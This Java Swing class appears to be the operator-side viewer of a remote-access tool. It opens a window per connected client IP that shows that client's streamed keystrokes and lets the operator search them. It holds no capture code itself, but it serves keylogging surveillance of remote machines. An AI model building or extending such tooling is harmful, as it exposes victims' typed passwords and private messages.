package server.features;

import server.connection.ClientConnection;

import javax.swing.*;
import javax.swing.text.DefaultCaret;
import javax.swing.text.DefaultHighlighter;
import javax.swing.text.Highlighter;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.KeyEvent;

public class KeyboardServer {
    public boolean receivingKey;
    public JTextArea textArea;

    public final JFrame popupFrame;
    private JButton clearButton;
    private JTextField searchField;
    private JButton searchButton;
    private String lastSearchText = "";

    public KeyboardServer(ClientConnection clientConnection) {
        popupFrame = new JFrame("Keyboard(" + clientConnection.getIP() + ")");
        popupFrame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        setupUI(clientConnection.getName());
        centerWindow(popupFrame);
    }

    private void setupUI(String clientName) {
        popupFrame.setLayout(new BorderLayout());

        // Setup text area
        setupTextArea(clientName);

        // Setup control panel
        JPanel controlPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));

        clearButton = new JButton("Clear");
        clearButton.addActionListener(e -> {
            textArea.setText("");
            textArea.append("Keyboard receive from: " + clientName + ".\n");
            clearSearch();
        });
        controlPanel.add(clearButton);

        searchField = new JTextField(20);
        controlPanel.add(searchField);

        searchButton = new JButton("Search");
        searchButton.addActionListener(e -> performSearch());
        controlPanel.add(searchButton);

        popupFrame.add(controlPanel, BorderLayout.NORTH);

        // Setup key bindings for search
        setupKeyBindings();
    }

    private void setupTextArea(String clientName) {
        textArea = new JTextArea();
        textArea.setEditable(false);
        JScrollPane scrollPane = new JScrollPane(textArea);
        textArea.append("Keyboard receive from: " + clientName + ".\n");
        DefaultCaret caret = (DefaultCaret) textArea.getCaret();
        caret.setUpdatePolicy(DefaultCaret.ALWAYS_UPDATE);
        popupFrame.getContentPane().add(scrollPane, BorderLayout.CENTER);
    }

    private void setupKeyBindings() {
        InputMap inputMap = popupFrame.getRootPane().getInputMap(JComponent.WHEN_IN_FOCUSED_WINDOW);
        ActionMap actionMap = popupFrame.getRootPane().getActionMap();

        inputMap.put(KeyStroke.getKeyStroke(KeyEvent.VK_F, KeyEvent.CTRL_DOWN_MASK), "performSearch");
        actionMap.put("performSearch", new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                searchField.requestFocusInWindow();
            }
        });
    }

    private void centerWindow(Window window) {
        Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();
        int x = (int) ((dimension.getWidth() - window.getWidth()) / 2);
        int y = (int) ((dimension.getHeight() - window.getHeight()) / 2);
        window.setLocation(x, y);
    }

    public void startReceivingKey() {
        showKeyPopup();
        receivingKey = true;
    }

    public void stopReceivingKey() {
        popupFrame.setVisible(false);
        receivingKey = false;
    }

    private void showKeyPopup() {
        popupFrame.setVisible(true);
        popupFrame.setSize(400, 600);
    }

    public void updateKeyPopup(String string) {
        if (string.contains("\n"))
            textArea.append("[ENTER]");
        if (string.contains("["))
            textArea.append(" " + string + " ");
        else
            textArea.append(string);

        // Re-apply the search after updating the text
        if (!lastSearchText.isEmpty()) {
            performSearch();
        }
    }

    private void performSearch() {
        String searchText = searchField.getText().toLowerCase();
        lastSearchText = searchText;  // Store the last search text
        String content = textArea.getText().toLowerCase();
        Highlighter highlighter = textArea.getHighlighter();
        highlighter.removeAllHighlights();

        if (searchText.isEmpty()) {
            return;
        }

        int index = content.indexOf(searchText);
        while (index > 0) {
            try {
                highlighter.addHighlight(index, index + searchText.length(),
                        new DefaultHighlighter.DefaultHighlightPainter(Color.YELLOW));
                index = content.indexOf(searchText, index + 1);
            } catch (Exception e) {
                e.printStackTrace();
                break;
            }
        }
    }

    private void clearSearch() {
        searchField.setText("");
        lastSearchText = "";
        textArea.getHighlighter().removeAllHighlights();
    }
}